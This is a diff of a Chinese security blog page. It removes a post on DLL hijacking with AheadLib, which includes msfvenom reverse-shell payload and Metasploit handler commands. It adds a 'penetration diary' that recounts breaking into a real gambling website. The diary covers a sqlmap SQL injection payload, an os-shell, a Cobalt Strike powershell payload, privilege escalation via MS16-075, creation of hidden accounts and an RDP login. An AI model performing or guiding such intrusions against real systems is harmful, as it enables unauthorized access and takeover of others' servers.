@@ -16,31 +16,33 @@
   <meta name="author" content="Glacier">
   <meta name="keywords" content="">
   
-    <meta name="description" content="dll劫持与AheadLib最近在看msf配置信息的时候，看到生成dll文件，突然就想到了dll劫持，于是准备来折腾一下">
+    <meta name="description" content="渗透小计：碰到一个赌博网站，通过sql注入成功上线，记录一下渗透过程">
 <meta property="og:type" content="article">
-<meta property="og:title" content="dll劫持与AheadLib">
-<meta property="og:url" content="https://glacierrrr.online/2022/08/18/dll%E5%8A%AB%E6%8C%81%E4%B8%8EAheadLib/index.html">
+<meta property="og:title" content="渗透日记1">
+<meta property="og:url" content="https://glacierrrr.online/2022/12/31/%E6%B8%97%E9%80%8F%E6%97%A5%E8%AE%B01/index.html">
 <meta property="og:site_name" content="Glacier&#39;s Blog">
-<meta property="og:description" content="dll劫持与AheadLib最近在看msf配置信息的时候，看到生成dll文件，突然就想到了dll劫持，于是准备来折腾一下">
+<meta property="og:description" content="渗透小计：碰到一个赌博网站，通过sql注入成功上线，记录一下渗透过程">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://s2.loli.net/2022/08/18/kgBDKU17lNzXWQa.png">
-<meta property="og:image" content="https://s2.loli.net/2022/08/18/wp5fkSX9FNlmr2L.png">
-<meta property="og:image" content="https://s2.loli.net/2022/08/18/BAQiGUXbHg3z8wC.png">
-<meta property="og:image" content="https://s2.loli.net/2022/08/18/1JIjvcpbeUgOWFq.png">
-<meta property="og:image" content="https://s2.loli.net/2022/08/18/zank6NWHustC2cR.png">
-<meta property="og:image" content="https://s2.loli.net/2022/08/18/1ka4ZxJv6BO32WD.png">
-<meta property="og:image" content="https://s2.loli.net/2022/08/18/Qrme8qxodRO3NGs.png">
-<meta property="og:image" content="https://s2.loli.net/2022/08/18/ylZoMNxTp2Pfire.png">
-<meta property="article:published_time" content="2022-08-18T09:49:24.000Z">
-<meta property="article:modified_time" content="2022-10-18T06:16:07.017Z">
+<meta property="og:image" content="https://s2.loli.net/2022/12/31/b8drCavs5kyXoYi.png">
+<meta property="og:image" content="https://s2.loli.net/2022/12/31/gl3idPbAUkrfL74.png">
+<meta property="og:image" content="https://s2.loli.net/2022/12/31/mywZiORKlIuVE7J.png">
+<meta property="og:image" content="https://s2.loli.net/2022/12/31/6oigYVWBOR8NC1w.png">
+<meta property="og:image" content="https://s2.loli.net/2022/12/31/JjBMXFwiWxDYSPv.png">
+<meta property="og:image" content="https://s2.loli.net/2022/12/31/5Pw4VcCogFXyBfa.png">
+<meta property="og:image" content="https://s2.loli.net/2022/12/31/w6aOMXFRnEsyGxS.png">
+<meta property="og:image" content="https://s2.loli.net/2022/12/31/AE5fzRG1SjJ9us2.png">
+<meta property="og:image" content="https://s2.loli.net/2022/12/31/PrdYXkZBQzvfuht.png">
+<meta property="og:image" content="https://s2.loli.net/2022/12/31/PrdYXkZBQzvfuht.png">
+<meta property="article:published_time" content="2022-12-31T15:49:24.000Z">
+<meta property="article:modified_time" content="2022-12-31T16:13:42.441Z">
 <meta property="article:author" content="Glacier">
-<meta property="article:tag" content="dll劫持">
+<meta property="article:tag" content="渗透日记">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://s2.loli.net/2022/08/18/kgBDKU17lNzXWQa.png">
+<meta name="twitter:image" content="https://s2.loli.net/2022/12/31/b8drCavs5kyXoYi.png">
   
   
   
-  <title>dll劫持与AheadLib - Glacier&#39;s Blog</title>
+  <title>渗透日记1 - Glacier&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -205,7 +207,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="dll劫持与AheadLib"></span>
+            <span id="subtitle" data-typed-text="渗透日记1"></span>
           
         </div>
 
@@ -216,8 +218,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-08-18 17:49" pubdate>
-          2022年8月18日 下午
+        <time datetime="2022-12-31 23:49" pubdate>
+          2022年12月31日 晚上
         </time>
       </span>
     
@@ -228,7 +230,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.6k 字
+          820 字
         
       </span>
     
@@ -239,7 +241,7 @@
         
         
         
-          14 分钟
+          7 分钟
         
       </span>
     
@@ -277,50 +279,32 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">dll劫持与AheadLib</h1>
+            <h1 style="display: none">渗透日记1</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="dll劫持与AheadLib"><a href="#dll劫持与AheadLib" class="headerlink" title="dll劫持与AheadLib"></a>dll劫持与AheadLib</h1><p>最近在看msf配置信息的时候，看到生成dll文件，突然就想到了dll劫持，于是准备来折腾一下</p>
+                <p>渗透小计：碰到一个赌博网站，通过sql注入成功上线，记录一下渗透过程</p>
 <a id="more"></a>
 
-<h2 id="dll劫持"><a href="#dll劫持" class="headerlink" title="dll劫持"></a>dll劫持</h2><p>dll文件是计算机上的一类文件，提供给使用者一些开箱即用的变量、函数或类。库文件分为静态库和动态库，静态库和动态库的区别体现在程序的链接阶段：静态库在程序的链接阶段被复制到了程序中；动态库在链接阶段没有被复制到程序中，而是程序在运行时由系统动态加载到内存中供程序调用。使用动态库系统只需载入一次，不同的程序可以得到内存中相同的动态库的副本，因此节省了很多内存，而且使用动态库也便于模块化更新程序</p>
-<p>dll劫持是当一个可执行文件运行时，Windows加载器将可执行模块映射到进程的地址空间中，加载器分析可执行模块的输入表，并设法找出任何需要的DLL，并将它们映射到进程的地址空间</p>
-<blockquote>
-<p>简单来说，dll的存在就是方便程序来直接调用，避免将相同的内容重复多遍，以此来节省内存<br>而dll劫持，由下面一个例子说明</p>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><blockquote>
+<p>别忘记挂代理<br>先把网址放上来<code>aHR0cDovL3d3dy40MjAyMjIubmV0Lw==</code><br>我们把这个url拿到奇安信威胁研判中心去看一下<br><a target="_blank" rel="noopener" href="https://ti.qianxin.com/v2/search?type=domain&value=www.420222.net">奇安信威胁情报中心</a><br>拿到其真实IP<br><img src="https://s2.loli.net/2022/12/31/b8drCavs5kyXoYi.png" srcset="/img/loading.gif" lazyload><br>直接访问这个ip看一下是啥<br><img src="https://s2.loli.net/2022/12/31/gl3idPbAUkrfL74.png" srcset="/img/loading.gif" lazyload><br>发现直接404了，那我们拿去用nmap端口扫描一下，也可以用fofa去查一下</p>
 </blockquote>
-<p>一个可执行文件运行时，需要调用<code>test.dll</code>文件，但此时我们可以生成一个恶意的<code>test.dll</code>文件，并让他调用我们由msf生成的<code>shell.dll</code>或者其他后门，再调用原来的<code>test.dll</code>文件</p>
-<p><img src="https://s2.loli.net/2022/08/18/kgBDKU17lNzXWQa.png" srcset="/img/loading.gif" lazyload alt="图解dll劫持"></p>
-<p>如果dll劫持成功了，那原本的可执行文件仍将正常使用，但我们的后门也将成功执行，即msf上线</p>
-<h2 id="AheadLib"><a href="#AheadLib" class="headerlink" title="AheadLib"></a>AheadLib</h2><p>这里推荐一个用来生成dll转发的工具<a target="_blank" rel="noopener" href="https://github.com/Yonsm/AheadLib">AheadLib</a></p>
-<p>我们随便找一个dll文件来测试一下</p>
-<p><img src="https://s2.loli.net/2022/08/18/wp5fkSX9FNlmr2L.png" srcset="/img/loading.gif" lazyload></p>
-<p>我们把它生成的代码复制下来，用VisualStudio创建一个dll动态链接项目，但在这里，可能会出现比较多的问题<br>我这里使用的是ViusalStudio 2019 不同的版本可能会出现的问题不同</p>
-<p>首先项目提示我没有引入头文件，于是我加上了<code>#include &quot;pch.h&quot;</code><br>紧接着出现了如下的报错</p>
-<p><img src="https://s2.loli.net/2022/08/18/BAQiGUXbHg3z8wC.png" srcset="/img/loading.gif" lazyload></p>
-<p>解决方法是，在<code>项目-&gt;属性-&gt;高级-&gt;字符集</code> 改为使用多字节字符集</p>
-<p><img src="https://s2.loli.net/2022/08/18/1JIjvcpbeUgOWFq.png" srcset="/img/loading.gif" lazyload></p>
-<p>其他版本的可能存在不同的报错，可以尝试如下方法</p>
-<ol>
-<li>将运行库改为多线程(/MT)<br><img src="https://s2.loli.net/2022/08/18/zank6NWHustC2cR.png" srcset="/img/loading.gif" lazyload></li>
-<li>将预编译头改为不使用<br><img src="https://s2.loli.net/2022/08/18/1ka4ZxJv6BO32WD.png" srcset="/img/loading.gif" lazyload></li>
-</ol>
-<p>确认应用之后就只会有一个报错，我们不用管它，在Release x86的模式下，成功生成dll文件<br>成功处理好报错信息后，我们实现了由<code>test(evil).dll -&gt; test(org).dll</code><br>接下来实现<code>test(evil).dll-&gt;shell.dll</code><br>我们在AheadLib工具生成的cpp文件中，找到<code>DLLMain</code>函数，并加上我们需要调用的后门<code>shell.dll</code></p>
-<p><img src="https://s2.loli.net/2022/08/18/Qrme8qxodRO3NGs.png" srcset="/img/loading.gif" lazyload></p>
-<p>成功编译后，将生成的dll文件改为与原dll相同的名字，即<code>test.dll</code>，将原本的test.dll改为<code>testorg.dll</code><br>这样我们就完成了dll劫持，当运行可执行文件时，将会先调用我们改写的<code>test.dll</code></p>
-<p>最后，msf成功上线</p>
-<p><img src="https://s2.loli.net/2022/08/18/ylZoMNxTp2Pfire.png" srcset="/img/loading.gif" lazyload></p>
-<hr>
-<h2 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h2><p>最近浅浅的看了下sh文件的写法，于是就想到了写一些msf的sh文件，避免了每次使用msfconsole的复杂配置与msfvenum生成的复杂参数</p>
+<p>这里我用fofa直接扫到一个端口8099是后台登陆<br><img src="https://s2.loli.net/2022/12/31/mywZiORKlIuVE7J.png" srcset="/img/loading.gif" lazyload></p>
+<p>访问进入其后台登录界面<br><img src="https://s2.loli.net/2022/12/31/6oigYVWBOR8NC1w.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="开始渗透"><a href="#开始渗透" class="headerlink" title="开始渗透"></a>开始渗透</h1><p>我们用bp先抓个包看一下<br><img src="https://s2.loli.net/2022/12/31/JjBMXFwiWxDYSPv.png" srcset="/img/loading.gif" lazyload><br>可以看到，这个流量十分的干净，没有多余的data，并且是直接明文传输的POST<br>到这里，我们第一个想到的肯定就是sql注入尝试一下</p>
 <blockquote>
-<p>msfvenum的生成</p>
+<p>这里用到一个小技巧，在需要尝试注入的地方加上<code>*</code>，并删去非注入点的<code>*</code>，传给sqlmap，能更好的注入<br><img src="https://s2.loli.net/2022/12/31/5Pw4VcCogFXyBfa.png" srcset="/img/loading.gif" lazyload></p>
 </blockquote>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sh">ip=192.168.31.208<br>port=4444<br>arch=x86<br>platform=windows<br>format=exe<br>payload=windows/meterpreter/reverse_tcp<br><span class="hljs-comment">#use exploit/muilt/handler</span><br>out=../meter_re_tcp_x86.exe<br><br>msfvenom -p <span class="hljs-variable">$payload</span> LHOST=<span class="hljs-variable">$ip</span> LPORT=<span class="hljs-variable">$port</span> -f <span class="hljs-variable">$format</span> -a <span class="hljs-variable">$arch</span> --platform <span class="hljs-variable">$platform</span> -o <span class="hljs-variable">$out</span><br></code></pre></td></tr></table></figure>
+<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>直接上sqlmap看一下，有没有可以注入的点<br><img src="https://s2.loli.net/2022/12/31/w6aOMXFRnEsyGxS.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到sqlmap的回显,这里是有注入点的<br><code>Title: Microsoft SQL Server/Sybase stacked queries (comment)</code><br><code>Payload: userName=&#39;;WAITFOR DELAY &#39;0:0:10&#39;--1&amp;password=1</code><br>也可以看到数据库的类型，是mssql，由此可以想到，我们需要判断是否为dba用户（dba用户就是sql数据库的管理员）<br><code>--is-dba</code><br>得到sqlmap的回显，确定了是dba用户<br><img src="https://s2.loli.net/2022/12/31/AE5fzRG1SjJ9us2.png" srcset="/img/loading.gif" lazyload></p>
+<p>由于是mssql，与mysql不一样，可以直接使用<code>--os-shell</code>连接，不需要上传文件找路径等一些麻烦操作</p>
 <blockquote>
-<p>msfconsole的监听</p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/307345176">–os-shell原理</a><br>成功连上shell之后，用cs生成一个powershell command的payload，直接执行</p>
 </blockquote>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">use exploit/multi/handler<br><span class="hljs-built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> LHOST 192.168.31.208<br><span class="hljs-built_in">set</span> LPORT 4444<br>run<br></code></pre></td></tr></table></figure>
+<p>成功上线！<br><img src="https://s2.loli.net/2022/12/31/PrdYXkZBQzvfuht.png" srcset="/img/loading.gif" lazyload><br>通过我们在fofa查到的版本信息，我们直接用<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2016/ms16-075">ms16-075</a>来打</p>
+<p>成功提权！<br><img src="https://s2.loli.net/2022/12/31/PrdYXkZBQzvfuht.png" srcset="/img/loading.gif" lazyload><br>接下来就是创建隐藏用户等等操作，这里直接用cs的脚本插件，一键直接创建</p>
+<p>这里就不放图了，提权成功一把梭<br>最后成功连接远程3389桌面！</p>
 
                 
               </div>
@@ -354,7 +338,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/dll%E5%8A%AB%E6%8C%81/">#dll劫持</a>
+        <a href="/tags/%E6%B8%97%E9%80%8F%E6%97%A5%E8%AE%B0/">#渗透日记</a>
       
     </div>
   
@@ -366,8 +350,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>dll劫持与AheadLib</div>
-      <div>https://glacierrrr.online/2022/08/18/dll劫持与AheadLib/</div>
+      <div>渗透日记1</div>
+      <div>https://glacierrrr.online/2022/12/31/渗透日记1/</div>
     </div>
     <div class="license-meta">
       
@@ -379,7 +363,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2022年8月18日</div>
+          <div>2022年12月31日</div>
         </div>
       
       
@@ -411,18 +395,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/09/11/PHP%E5%85%8D%E6%9D%80/" title="PHP免杀">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">PHP免杀</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/08/18/dll%E5%8A%AB%E6%8C%81_%E7%99%BD%E5%8A%A0%E9%BB%91/" title="dll劫持_白加黑">
-                        <span class="hidden-mobile">dll劫持_白加黑</span>
+                      <a href="/2022/11/28/Cobaltstrike%E4%B8%8A%E7%BA%BF%E8%BF%87%E7%A8%8B%E4%B8%8E%E8%93%9D%E9%98%9F%E5%8F%8D%E5%88%B6/" title="Cobaltstrike上线过程与蓝队反制">
+                        <span class="hidden-mobile">Cobaltstrike上线过程与蓝队反制</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
